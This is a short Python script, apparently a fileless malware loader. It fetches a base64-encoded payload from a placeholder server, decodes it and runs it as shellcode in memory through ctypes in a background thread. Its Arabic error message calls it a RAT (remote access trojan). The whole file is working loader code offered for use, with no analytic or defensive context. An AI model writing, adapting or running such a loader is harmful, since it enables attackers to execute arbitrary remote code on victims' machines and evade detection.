import ctypes
import requests
import base64
import threading
import os

def load_in_memory(url):
    response = requests.get(url)
    return base64.b64decode(response.content)

def execute_in_memory(shellcode):
    shellcode_buffer = bytearray(shellcode)
    func = ctypes.cast(ctypes.create_string_buffer(shellcode_buffer, len(shellcode_buffer)),
                       ctypes.CFUNCTYPE(ctypes.c_void_p))
    thread = threading.Thread(target=func)
    thread.daemon = True
    thread.start()

if __name__ == "__main__":
    payload_url = "http://yourserver.com/payload.bin"
    try:
        payload = load_in_memory(payload_url)
        execute_in_memory(payload)
    except Exception as e:
        print("[-] فشل في تنفيذ RAT من الذاكرة:", str(e))